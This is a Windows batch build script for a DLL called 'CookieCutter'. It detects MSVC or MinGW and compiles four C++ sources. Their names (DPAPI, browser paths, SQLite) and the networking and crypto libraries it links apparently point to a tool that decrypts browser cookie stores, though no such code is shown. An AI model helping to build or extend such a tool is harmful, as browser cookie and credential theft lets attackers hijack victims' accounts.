@echo off
REM =============================================================================
REM  build.bat — CookieCutter DLL Builder
REM  Requires: Visual Studio 2022 (or 2019) with C++ Desktop workload
REM            OR MinGW-w64 (g++)
REM
REM  Usage:
REM    build.bat              → auto-detect compiler
REM    build.bat msvc         → force MSVC
REM    build.bat mingw        → force MinGW
REM    build.bat clean        → remove build artifacts
REM
REM  Output: cookiecutter.dll (x64) in current directory
REM =============================================================================

setlocal enabledelayedexpansion
cd /d "%~dp0"

set OUT_DIR=..\
set NATIVE_DIR=%~dp0

REM --- Files to compile ---
set SOURCES=cookiecutter.cpp dpapi.cpp browser_paths.cpp sqlite_minimal.cpp

REM =========================================================================
REM  Clean mode
REM =========================================================================
if /I "%~1"=="clean" (
    echo [*] Cleaning build artifacts...
    del /Q "%OUT_DIR%cookiecutter.dll" 2>nul
    del /Q "%OUT_DIR%cookiecutter.exp" 2>nul
    del /Q "%OUT_DIR%cookiecutter.lib" 2>nul
    del /Q "%OUT_DIR%*.obj" 2>nul
    echo [+] Clean complete.
    exit /b 0
)

REM =========================================================================
REM  Compiler detection
REM =========================================================================

set USE_COMPILER=%~1
if "%USE_COMPILER%"=="" (
    REM Auto-detect
    where cl.exe >nul 2>&1
    if !ERRORLEVEL!==0 (
        set USE_COMPILER=msvc
    ) else (
        where g++.exe >nul 2>&1
        if !ERRORLEVEL!==0 (
            set USE_COMPILER=mingw
        ) else (
            echo [!] No compiler found.
            echo [!] Install Visual Studio Build Tools or MinGW-w64.
            echo.
            echo Visual Studio 2022 Build Tools (free):
            echo   https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
            echo   Select "Desktop development with C++" workload.
            echo   Then run from: "x64 Native Tools Command Prompt for VS 2022"
            echo.
            echo Or MinGW-w64:
            echo   pacman -S mingw-w64-x86_64-gcc  (MSYS2)
            echo.
            exit /b 1
        )
    )
)

REM =========================================================================
REM  MSVC Build
REM =========================================================================

if /I "%USE_COMPILER%"=="msvc" (
    echo [*] Building with MSVC (x64, static CRT, optimized)...

    REM Ensure we're in a VS dev shell; if not, try to find vcvars64.bat
    where cl.exe >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        REM Try to set up VS environment
        set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
        if exist "!VSWHERE!" (
            for /f "usebackq tokens=*" %%i in (`"!VSWHERE!" -latest -property installationPath`) do (
                set "VS_PATH=%%i"
            )
            if exist "!VS_PATH!\VC\Auxiliary\Build\vcvars64.bat" (
                call "!VS_PATH!\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
                echo [*] Initialized VS environment from !VS_PATH!
            )
        )
    )

    REM Verify cl.exe is now available
    where cl.exe >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [!] cl.exe still not found. Run from "x64 Native Tools Command Prompt".
        exit /b 1
    )

    REM Compile and link
    cl.exe /nologo /LD /EHsc /O2 /MT /std:c++17 /D COOKIECUTTER_EXPORTS /D NDEBUG ^
        /Fe:"%OUT_DIR%cookiecutter.dll" ^
        %SOURCES% ^
        /link ws2_32.lib crypt32.lib iphlpapi.lib shell32.lib advapi32.lib ^
        /OPT:REF /OPT:ICF

    if !ERRORLEVEL! neq 0 (
        echo [!] MSVC build FAILED.
        exit /b 1
    )

    echo [+] Build successful: %OUT_DIR%cookiecutter.dll
    goto :done
)

REM =========================================================================
REM  MinGW Build
REM =========================================================================

if /I "%USE_COMPILER%"=="mingw" (
    echo [*] Building with MinGW-w64 (x64, static, optimized)...

    where g++.exe >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [!] g++.exe not found. Install MinGW-w64.
        exit /b 1
    )

    g++.exe -shared -o "%OUT_DIR%cookiecutter.dll" ^
        -std=c++17 -O2 -s ^
        -D COOKIECUTTER_EXPORTS -D NDEBUG ^
        -static-libgcc -static-libstdc++ ^
        %SOURCES% ^
        -lws2_32 -lcrypt32 -liphlpapi -lshell32 -ladvapi32

    if !ERRORLEVEL! neq 0 (
        echo [!] MinGW build FAILED.
        exit /b 1
    )

    echo [+] Build successful: %OUT_DIR%cookiecutter.dll
    goto :done
)

echo [!] Unknown compiler: %USE_COMPILER%
exit /b 1

:done
REM Show file info
dir "%OUT_DIR%cookiecutter.dll" 2>nul
exit /b 0
